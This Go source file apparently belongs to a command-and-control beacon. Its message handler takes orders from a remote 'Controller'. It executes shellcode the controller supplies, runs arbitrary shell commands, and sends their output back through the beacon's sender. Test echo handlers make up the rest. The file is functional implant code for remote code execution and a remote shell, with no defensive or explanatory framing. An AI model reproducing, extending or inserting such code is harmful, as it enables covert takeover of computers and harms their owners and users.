package beacon

import (
	"bytes"
	"context"
	"fmt"
	"sync"

	"github.com/davecgh/go-spew/spew"

	"project/internal/convert"
	"project/internal/logger"
	"project/internal/messages"
	"project/internal/module/shell"
	"project/internal/module/shellcode"
	"project/internal/patch/msgpack"
	"project/internal/protocol"
	"project/internal/xpanic"
)

type handler struct {
	ctx *Beacon

	context context.Context
	cancel  context.CancelFunc
	wg      sync.WaitGroup
}

func newHandler(ctx *Beacon) *handler {
	h := handler{
		ctx: ctx,
	}
	h.context, h.cancel = context.WithCancel(context.Background())
	return &h
}

func (h *handler) Cancel() {
	h.cancel()
}

func (h *handler) Close() {
	h.wg.Wait()
	h.ctx = nil
}

func (h *handler) logf(lv logger.Level, format string, log ...interface{}) {
	h.ctx.logger.Printf(lv, "handler", format, log...)
}

func (h *handler) log(lv logger.Level, log ...interface{}) {
	h.ctx.logger.Println(lv, "handler", log...)
}

// logPanic must use like defer h.logPanic("title")
func (h *handler) logPanic(title string) {
	if r := recover(); r != nil {
		h.log(logger.Fatal, xpanic.Print(r, title))
	}
}

// logfWithInfo will print log with role GUID and message
// [2020-01-30 15:13:07] [info] <handler> foo logf
// spew output...
//
// first log interface must be *protocol.Answer

// func (h *handler) logfWithInfo(lv logger.Level, format string, log ...interface{}) {
// 	buf := new(bytes.Buffer)
// 	_, _ = fmt.Fprintf(buf, format, log[1:]...)
// 	buf.WriteString("\n")
// 	spew.Fdump(buf, log[0])
// 	h.ctx.logger.Print(lv, "handler", buf)
// }

// logWithInfo will print log with role GUID and message
// [2020-01-30 15:13:07] [info] <handler> foo log
// spew output...
//
// first log interface must be *protocol.Answer
func (h *handler) logWithInfo(lv logger.Level, log ...interface{}) {
	buf := new(bytes.Buffer)
	_, _ = fmt.Fprintln(buf, log[1:]...)
	spew.Fdump(buf, log[0])
	h.ctx.logger.Print(lv, "handler", buf)
}

// OnMessage is used to handle message from Controller.
// <warning> the function must be block, you can't not use
// answer *protocol.Answer in go func(), if you want to use it,
// must copy it, because answer is from sync.Pool.
func (h *handler) OnMessage(answer *protocol.Answer) {
	defer h.logPanic("handler.OnMessage")
	if len(answer.Message) < messages.HeaderSize {
		const log = "controller send with invalid size"
		h.logWithInfo(logger.Exploit, answer, log)
		return
	}
	msgType := convert.BytesToUint32(answer.Message[messages.RandomDataSize:messages.HeaderSize])
	answer.Message = answer.Message[messages.HeaderSize:]
	switch msgType {
	case messages.CMDExecuteShellCode:
		h.handleExecuteShellCode(answer)
	case messages.CMDSingleShell:
		h.handleSingleShell(answer)
	case messages.CMDTest:
		h.handleSendTestMessage(answer)
	case messages.CMDRTTestRequest:
		h.handleSendTestRequest(answer)
	case messages.CMDRTTestResponse:
		h.handleSendTestResponse(answer)
	default:
		const format = "controller send unknown message\ntype: 0x%08X\n%s"
		h.logf(logger.Exploit, format, msgType, spew.Sdump(answer))
	}
}

func (h *handler) handleExecuteShellCode(answer *protocol.Answer) {
	defer h.logPanic("handler.handleExecuteShellCode")
	es := new(messages.ExecuteShellCode)
	err := msgpack.Unmarshal(answer.Message, es)
	if err != nil {
		const log = "controller send invalid shellcode"
		h.logWithInfo(logger.Exploit, answer, log)
		return
	}
	// must copy, because not use h.wg
	lg := h.ctx.logger
	go func() {
		err = shellcode.Execute(es.Method, es.ShellCode)
		if err != nil {
			lg.Println(logger.Error, "failed to execute shellcode:", err)
		}
	}()
}

func (h *handler) handleSingleShell(answer *protocol.Answer) {
	const title = "handler.handleSingleShell"
	defer h.logPanic(title)
	ss := new(messages.SingleShell)
	err := msgpack.Unmarshal(answer.Message, ss)
	if err != nil {
		const log = "controller send invalid single shell"
		h.logWithInfo(logger.Exploit, answer, log)
		return
	}
	h.wg.Add(1)
	go func() {
		defer func() {
			h.logPanic(title)
			h.wg.Done()
		}()
		sso := &messages.SingleShellOutput{ID: ss.ID}
		sso.Output, err = shell.Shell(h.context, ss.Command)
		if err != nil {
			sso.Err = err.Error()
		}
		err = h.ctx.sender.Send(h.context, messages.CMDBSingleShellOutput, sso, true)
		if err != nil {
			h.log(logger.Error, "failed to send single shell output:", err)
		}
	}()
}

// -----------------------------------------send test----------------------------------------------

func (h *handler) handleSendTestMessage(answer *protocol.Answer) {
	defer h.logPanic("handler.handleSendTestMessage")
	err := h.ctx.Test.AddSendTestMessage(h.context, answer.Message)
	if err != nil {
		const log = "failed to add send test message\nerror:"
		h.logWithInfo(logger.Fatal, answer, log, err)
	}
}

func (h *handler) handleSendTestRequest(answer *protocol.Answer) {
	defer h.logPanic("handler.handleSendTestRequest")
	request := new(messages.TestRequest)
	err := msgpack.Unmarshal(answer.Message, request)
	if err != nil {
		const log = "invalid test request data\nerror:"
		h.logWithInfo(logger.Exploit, answer, log, err)
		return
	}
	// send response
	response := &messages.TestResponse{
		ID:       request.ID,
		Response: request.Request,
	}
	err = h.ctx.sender.Send(h.context, messages.CMDBRTTestResponse, response, true)
	if err != nil {
		const log = "failed to send test response\nerror:"
		h.logWithInfo(logger.Exploit, answer, log, err)
	}
}

func (h *handler) handleSendTestResponse(answer *protocol.Answer) {
	defer h.logPanic("handler.handleSendTestResponse")
	response := new(messages.TestResponse)
	err := msgpack.Unmarshal(answer.Message, response)
	if err != nil {
		const log = "invalid test response data\nerror:"
		h.logWithInfo(logger.Exploit, answer, log, err)
		return
	}
	h.ctx.messageMgr.HandleReply(response.ID, response)
}
